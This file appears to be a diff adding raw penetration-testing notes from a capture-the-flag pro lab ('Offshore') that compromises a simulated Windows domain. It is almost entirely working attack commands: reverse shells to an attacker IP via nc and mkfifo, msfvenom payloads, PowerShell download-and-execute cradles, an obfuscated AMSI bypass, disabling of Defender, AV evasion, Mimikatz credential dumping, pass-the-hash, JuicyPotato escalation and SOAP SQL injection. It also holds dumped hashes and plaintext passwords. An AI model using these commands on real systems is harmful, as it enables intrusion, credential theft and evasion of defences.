@@ -1,0 +1,402 @@
+----find----
+dir /s *flag.txt*
+
+where /r C:\ flag.txt
+Get-ChildItem c:\*.txt -Recurse | Select-String -Pattern OFFSHORE
+--
+
+10.10.14.2
+10.10.110.0/24
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+| revshell msf 10.10.14.2 443
+| revshell std 10.10.14.2 443
+OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
+perl -e 'exec "/bin/sh";'
+echo os.system('/bin/sh')
+python - c  'import os;os.system("/bin/sh")' 
+10.10.110.123
+172.16.1.23 
+nc -e /bin/sh 10.10.14.2 1234
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
+$ bash -i
+curl -O http://10.10.14.2:8000/unix-privesc-check-master
+curl -O http://10.10.14.2:8000/unix-privesc-check-master/upc.sh
+find . -name flag.txt
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o /tmp/payload.bin
+msfvenom -a x64 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -b "\x00" -f elf -o payload1
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o /tmp/payload64.bin
+splunk file /opt/splunk/etc/splunk-launch.conf
+edit it and make to run root
+now reboot by http://10.10.110.123/reboot.php?reboot=1
+now get shell again , get root
+OFFSHORE{fun_w1th_m@g1k_bl0ck$}
+OFFSHORE{st0p_tai1ing_m3_br0}
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
+grep -inr "OFFSHORE" /
+grep -H -r "OFFSHORE" /
+grep -r "OFFSHORE" ~/*.txt
+find . -name id_rsa
+cat known_hosts
+|1|OsEREGJWQ0EccKMKUM4Kdi21cR4=|NDQB/D0M1imSLcfxUnj2w1sc+Bw= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBjQQc098ueAsYSxV4zZw0QBUmenLsuhuEH4p5QB1bhnEDcSoKgNdXSw9055D0f3U8R7jX9Key7eu1iRzY7XnSk=
+tcpdump  -i eth0 -w mycap.pcap
+nc 10.10.14.2 5555 < test.pcap
+nc -nlvp > test.pcap
+tcpdump -s 0 -i eth0 -w mycap.pcap
+OFFSHORE{l0v3_cl3artext_pr0toc0l$}
+POST /apiclient/login.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.2068
+Content-Type: application/x-www-form-urlencoded
+Host: 172.16.1.23
+Content-Length: 79
+Expect: 100-continue
+Connection: Keep-Alive
+HTTP/1.1 100 Continue
+username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!HTTP/1.1 404 Not Found
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o payload64.bin
+---------------
+172.16.1.30
+nmap from out-dirbuster-splunk misconfig-shell-escape to root shell- ssh- tcpdump-
+-----
+DC01-172.16.1.5
+SQL01-172.16.1.15
+WS02 -172.16.1.101
+MS01-172.16.1.30
+WSADM-172.16.1.36
+WEB-WIN01-172.16.1.24
+-----------
+ssh -D 22 -f -C -q -N 172.16.1.30
+run autoroute -s 172.16.1.0/24
+run autoroute -p
+background
+use auxiliary/server/socks4a
+use auxiliary/scanner/portscan/tcp
+use multi/manage/autoroute
+met>portfwd add -l 80 -ip 80 -r 172.16.1.30
+[+] 172.16.1.30:          - 172.16.1.30:22 - TCP OPEN
+[+] 172.16.1.30:          - 172.16.1.30:80 - TCP OPEN
+[+] 172.16.1.30:          - 172.16.1.30:135 - TCP OPEN
+[+] 172.16.1.30:          - 172.16.1.30:139 - TCP OPEN
+[+] 172.16.1.30:          - 172.16.1.30:445 - TCP OPEN
+proxychains nmap -Pn -sT -p445,80 172.16.1.30
+route add 172.0.0.0 255.0.0.0
+root@kali:~/pro# ssh -D 1337 -q -C -N -i id_rsa 10.10.110.123
+firefox > settings > proxy > manual > localhost 1337 , socks5 to select
+
+ssh -D 1337 -q -C -N -i id_rsa 10.10.110.123
+-------------------------
+ssh -L 127.0.0.1:10000:172.16.1.30:80 -i id_rsa root@10.10.110.123
+
+admin
+Zaq12wsx!
+
+API_KEY=e9ea1e162f47f8922f130093c612e9fc
+
+https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
+
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://172.16.1.23:1234/minirev.ps1');"
+OFFSHORE{RC3_a$_@_s3rv1c3}
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/nc.exe','c:\test.exe')
+run the netcat now c:\test.exe 10.10.16.11 444 -e cmd.exe
+dir /s *flag.txt*
+using powershell to search
+
+Get-ChildItem c:\*.txt -Recurse | Select-String -Pattern OFFSHORE
+Get-ChildItem c:\ -Recurse | Select-String -Pattern OFFSHORE
+ManageEngine_new\OpManager\pgsql\data\base\16384\25730:1:??5??P
+Flag3OFFSHORE{sm3lls_so_g00d}
+------------------------
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.14.2:8000/wget.exe','c:\test\test1\wget.exe')
+
+wget.exe -r -np -R "index.html*" http://10.10.14.2:8000/ADModule-master
+
+ssh -L 127.0.0.1:1189:172.16.1.30:3389 -i id_rsa root@10.10.110.123
+
+C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 
+ps> powershell
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.14.2:8000/PowerView.ps1','c:\test\test1\PowerView.ps1')
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.14.2:8000/Invoke-Mimikatz.ps1','c:\test\test1\Invoke-Mimikatz.ps1')
+wget.exe http://10.10.14.2/Invoke-Mimikatz.p
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/wget.exe','c:\test\wget.exe')
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/shell-x64.exe,'c:\test\shell-x64.exe')
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.11 LPORT=445 -f exe > shell-x64.exe
+load shell-64.exe with meterpreter payload 
+load kiwi
+Dump_creds in meterpreter
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svc_opmanager /domain:corp.local /ntlm:6bd08e1c070d29efaca47f3d7f816509 /run:powershell.exe"' 
+migrate 5604 to that powershell creates( need to search this)
+use powershell and any one of the below commands to perform powershell remoting
+Enter-PSSession ms01.corp.local 
+PS C:\test> Invoke-Command -ComputerName ms01.corp.local -ScriptBlock{whoami;hostname}
+PS C:\test> . .\PowerView.ps1  
+
+6bd08e1c070d29efaca47f3d7f816509
+lsadump::changentlm /server:dc01.corp.local /user:svc_opmanager /old:6bd08e1c070d29efaca47f3d7f816509 /newpassword:whateveriwant
+ssh -L 127.0.0.1:2000:172.16.1.36:80 -i id_rsa root@10.10.110.123
+914c166fbaaaedfa7ad721e9eae92fb7
+1f6c9827ef4cccf1e47085b96db015ac
+7f9282b3dfc84f25920241ff5016e505
+9e9484ae4d6c6b5683ed262ecc5ddf9d
+lsadump::changentlm /server:dc01.corp.local /user:svc_opmanager /old:c5a237b7e9d8e708d8436b6148a25fa1 /newpassword:test123
+
+---
+Trying sharphound with svc_opmanager shell
+Invoke-BloodHound -CollectionMethod All -Verbose
+172.16.1.36-wsadm
+ssh -L 127.0.0.1:2000:172.16.1.36:3389 -i id_rsa root@10.10.110.123
+xfreerdp /u:ned.flanders_adm /v:127.0.0.1:2000
+lsadump::setntlm /server:dc01.corp.local /user:svc_opmanager /password:nothackable!here
+xfreerdp /u:svc_opmanager  /d:corp /pth:c5a237b7e9d8e708d8436b6148a25fa1 /v:127.0.0.1:2000
+
+Set-ADAccountPassword -Identity $svc_opmanager -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$hacking@123" -Force)
+proxychains nmap -sT -PN -n -sV -p 445,139,3389 172.16.1.36
+----
+Tried with a excel sheet login.xls with john office2john.py cracked its password:broken
+Network login	ned.flanders_adm	Lefthandedyeah!
+Email	ned.flanders@offshore.com	Lefty1974!
+		
+		
+Bank		
+https://www.betabank.eu/	991103	0419!094Ar
+-====Also possible via mimikatz
+
+mimikatz(powershell) # vault::cred /patch
+TargetName : Domain:batch=TaskScheduler:Task:{6CB48ECD-1BF1-4AD7-9E73-5CEA4D757104} / <NULL>
+UserName   : CORP\svc_opmanager
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : Manage my engine 123!
+======
+
+
+Trying file transfer
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/wget.exe','C:\Users\ned.flanders_adm\test\test.exe')
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/PowerUp.ps1','C:\Users\ned.flanders_adm\test\PowerUp.ps1')
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/47684-1.exe','C:\Users\ned.flanders_adm\test\47684-1.exe')
+Invoke-BloodHound -CollectionMethod All
+
+Open powershell and put amsi bypass in that session
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+ iex (iwr http://10.10.16.11:8000/PowerView.ps1 -UseBasicParsing);
+services.msc
+
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/nc.exe','C:\Program Files (x86)\Lavasoft\Web Companion\Application\nc.exe')
+
+msfvenom --platform windows -x wget.exe -k -p windows/meterpreter/reverse_tcp lhost=10.10.16.11 lport=446 -e x64/shikata_ga_nai -i 3 -b "\x00" -f exe -o wgetX.exeFound 1 compatible encoders
+
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8001/whiglarf.exe','C:\Users\ned.flanders_adm\test\whiglarf.exe')
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8001/PowerView.ps1','C:\test\PowerView.ps1')
+
+ref:-https://github.com/nccgroup/Winpayloads
+http://10.0.2.15:8000/xfmeilor.exe.
+
+Upload it in wsadm and start the service
+sc start WcAssistantService
+PS C:\Users\wsadmin\Desktop> cat flag.txt
+cat flag.txt
+OFFSHORE{4t_y0ur_5erv1ce}
+---------------
+other methods to bypass AV
+https://blog.dylan.codes/bypassing-av-via/
+msfvenom -p windows/x64/meterpreter_bind_tcp LPORT=33777 -a x64 -f exe > bind_tcp-exe
+./darkarmour.py -f /home/black/htb/offshore/www/sub/bind_tcp-exe -j -l 5 -e xor -o darkmeter.exe
+transfer to meterpreter
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8001/shell-x64.exe','shell-x64.exe')
+set payload windows/x64/meterpreter/reverse_tcp
+--load kiwi--
+Username          Domain  NTLM                              SHA1                                      DPAPI
+--------          ------  ----                              ----                                      -----
+WSADM$            CORP    19f221a69c0693ebfdc064393b55d509  ef3a26edd7e7533956cd121ad45839b7f8e58df9  
+ned.flanders_adm  CORP    deff72637376f94d8e6c3fab3270f65d  60a145c0c5f8a58127ce8a65fde2ec5b7761a777  e02244464259fb3c9e4a177d90d72d47
+wsadmin           CORP    669b12a3bac275251170afbe2c5de8c2  62e3e767c5d2ad6521d8d3e0e672e299437ed666  41aff401de68a7ae9e94bdb6907dddb2
+
+tried:-
+xfreerdp /u:wsadmin /d:corp /pth:669b12a3bac275251170afbe2c5de8c2 /v:127.0.0.1:2000
+didnt work
+xfreerdp /u:ned.flanders_adm /d:corp /pth:deff72637376f94d8e6c3fab3270f65d /v:127.0.0.1:2000
+some acces restriction error
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:wsadmin /domain:corp.local /ntlm:669b12a3bac275251170afbe2c5de8c2 /run:powershell.exe"' 
+ssh -L 127.0.0.1:2001:172.16.1.101:3389 -i id_rsa root@10.10.110.123
+
+ssh -L 127.0.0.1:2002:172.16.1.101:445 -i id_rsa root@10.10.110.123
+pth-winexe -U corp/wsadmin%669b12a3bac275251170afbe2c5de8c2 //127.0.0.1:2002 cmd -didnt work
+crackmapexec smb 127.0.0.1:2002 -u wsadmin -H 669b12a3bac275251170afbe2c5de8c2- didnt work
+root@kali:/home/kali# evil-winrm -i 127.0.0.1 -P 2003 -u wsadmin -H 669b12a3bac275251170afbe2c5de8c2  -worked after portforwarded 5985 to local 2003
+*Evil-WinRM* PS C:\Users\wsadmin\Desktop> cat flag.txt
+OFFSHORE{mimikatz_d03s_th3_j0b}
+created a teest user with admin access.
+xfreerdp /u:test /v:127.0.0.1:2001
+just set:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+rebooot
+mimikatz
+than delete: 
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f
+reboot
+shutdown /r
+creds_all
+wsadmin   CORP    Workstationadmin1!
+wsadmin is admin in ws02 so.
+login rdp to ws02 owned and use sharphound
+Invoke-BloodHound -CollectionMethod All -Verbose
+also enumeraing in a file in c:\backups gives password for other user which can be usedin web-win 01
+<user name="svc_iis" password="Vintage!" /
+---------------------web-win01----------------------------
+few ports open
+Host is up (0.31s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+ssh -L 127.0.0.1:2005:172.16.1.24:3389 -i id_rsa root@10.10.110.123
+proxychains smbclient //172.16.1.24/ -U corp/wsadmin%Workstationadmin1!
+Find-LocalAdminAccess works to identify admin accesss in other machine in domain
+proxychains smbclient //172.16.1.24/ -U corp/svc_iis%Vintage!
+Nmap scan report for 172.16.1.15
+Host is up (0.33s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s
+3389/tcp open  ms-wbt-server
+---
+This one worked but no shell
+---
+1' or 1 = 1--
+--
+POST /DocumentsService.asmx HTTP/1.1
+Host: 127.0.0.1:1000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:1000/Dashboard
+Content-Type: text/xml
+X-Requested-With: XMLHttpRequest
+Content-Length: 446
+Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
+Connection: close
+Cookie: encryptPassForAutomaticSignin=252a0e12680dbf6b41e533cfa62d31d1; userNameForAutomaticSignin=admin; domainNameForAutomaticSignin=Authenticator; signInAutomatically=true; authrule_name=Authenticator; ASP.NET_SessionId=3sb3dtqp0vufk5ya2q0qxpwb
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getDocuments_Dev xmlns="http://tempuri.org/">
+      <document>test') UNION ALL SELECT NULL,@@version,NULL,NULL-- Sbkn</document>
+<author>test</author>
+    </getDocuments_Dev>
+  </soap:Body>
+</soap:Envelope>
+
+
+---------------------worked SOAP SQLI
+root@kali:/home/kali/pro# cat webgot.txt 
+POST /DocumentsService.asmx HTTP/1.1
+Host: 127.0.0.1:1000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.1.24/dashboard
+Content-Type: text/xml
+X-Requested-With: XMLHttpRequest
+Content-Length: 391
+Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
+Connection: close
+Cookie: ASP.NET_SessionId=3sb3dtqp0vufk5ya2q0qxpwb
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getDocuments_Dev xmlns="http://tempuri.org/">
+      <author>a</author>
+      <document>a</document>
+    </getDocuments_Dev>
+  </soap:Body>
+</soap:Envelope>
+
+---------------------
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.11:8000/minirev.ps1');"
+msfmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.11 LPORT=1337 -a x64 -f exe > reverseshell1337-16-11.exe
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.11:8000/reverseshell1337-16-11.exe','c:\temp\reverseshell1337-16-11.exe')
+but --os-pwn worked instead of the above manually
+C:\Users\MSSQL$SQLEXPRESS\Desktop>more flag.txt
+more flag.txt
+OFFSHORE{cm0n!_an0th3r_sqli!?}
+---
+powerup didnt show anything much but we can see that whoami /priv gave some results enabled -SeImpersonatePrivilege
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+------https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard---
+juicy potato cmd
+CLSID we need to get based on OS. here it was windows server 2016 (https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard)
+JuicyPotato.exe -l 1337 -p c:\test\shell-x64.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+Got shell as system.
+--
+C:\Users\Administrator\Desktop>more flag.txt
+more flag.txt
+OFFSHORE{hmm_p0tato3s}
+------
+meterpreter>load kiwi> creds_all
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+SQL01$    CORP    b40dae2bd88b86bf78ea95ba80f95f33  b3251c1ffe7ed34407c29fc38ee1c91eba155694
+----
+ssh -L 127.0.0.1:2001:172.16.1.15:3389 -i id_rsa root@10.10.110.123
+xfreerdp /u:test /v:127.0.0.1:2001
+Now under C:\users\public\ some folders are hidden, using file explorer and unhiding folders gives a folder C:\Users\Public\Libraries which has batch file
+if we run that it maps a share with bill and opening the share gives flag
+OFFSHORE{sl0ppy_scr1pting_hurt$}
+also had some more creds in backup.ps1
+#set server location,credentials
+$Server = "\\172.16.4.100"
+$FullPath = "$Server\q1\backups"
+$username = "pgibbons"
+$password = "I l0ve going Fishing!
+----
+Again used creds_all after login as different user
+msv credentials
+===============
+
+Username  Domain  NTLM                              SHA1                                      DPAPI
+--------  ------  ----                              ----                                      -----
+SQL01$    CORP    b40dae2bd88b86bf78ea95ba80f95f33  b3251c1ffe7ed34407c29fc38ee1c91eba155694  
+pgibbons  CORP    0694311c666b622f590f1c1837422c5f  cf69b3b3ec044df1a00327adcc17ed470bd9866fd  75ae561ca90a671904a624fdd50dd959
+test      SQL01   c20a43b71503528c05c57fcbff0c78e3  2d77b69f031ac7963707023ca1798f5e1165ef3e  
+
+ssp credentials
+===============
+
+Username  Domain  Password
+--------  ------  --------
+bill      CORP    I like to map Shares!
+--------
+Invoke-BloodHound -CollectionMethod All -Verbose
